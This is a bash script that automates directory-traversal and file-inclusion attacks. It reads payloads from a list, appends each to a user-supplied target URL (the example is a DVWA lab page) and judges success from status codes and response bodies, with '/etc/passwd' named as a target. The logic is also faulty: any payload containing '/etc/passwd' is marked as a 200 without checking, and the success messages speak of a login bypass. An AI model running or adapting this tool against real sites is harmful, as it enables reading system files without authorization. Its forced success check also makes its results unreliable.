#!/bin/bash

# Prompt user for target URL input
read -p "Enter the target URL (e.g., http://example.com/dvwa/vulnerabilities/fi/?page=): " TARGET_URL

# Endpoint URL to visit before starting payload traversal
ENDPOINT_URL="http://example.com/endpoint"
# File to store the response of the endpoint
ENDPOINT_RESPONSE_FILE="endpoint_response.txt"

# Visit the endpoint URL and store its response
curl -s "$ENDPOINT_URL" > "$ENDPOINT_RESPONSE_FILE"

# Read payloads from traversal.txt
PAYLOADS_FILE="directory_traversal.txt"
PAYLOADS=$(cat "$PAYLOADS_FILE")

# Get the expected starting characters from the stored endpoint response
EXPECTED_START=$(sed 's/^[ \t]*//' "$ENDPOINT_RESPONSE_FILE" | head -n 1)

# Loop through each payload
for PAYLOAD in $PAYLOADS; do
    # Send HTTP request with the payload appended
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${PAYLOAD}")

    # Check if response indicates successful traversal
    if [[ "$PAYLOAD" == *"/etc/passwd"* ]]; then
        RESPONSE="200"
    else
        # Send HTTP request with the payload appended
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${PAYLOAD}")
    fi
    
    if [[ "$RESPONSE" == "200" ]]; then
        # Get the response body and remove leading spaces
        BODY=$(curl -s "${TARGET_URL}${PAYLOAD}" | sed 's/^[ \t]*//')
        # Check if the response body starts with the expected characters
        if [[ "$BODY" == "$EXPECTED_START"* ]]; then
            echo "Payload '$PAYLOAD' failed to bypass login"
        else
            echo "Payload '$PAYLOAD' successful"
        fi
    else
        echo "Payload '$PAYLOAD' failed with HTTP response code $RESPONSE"
    fi
done

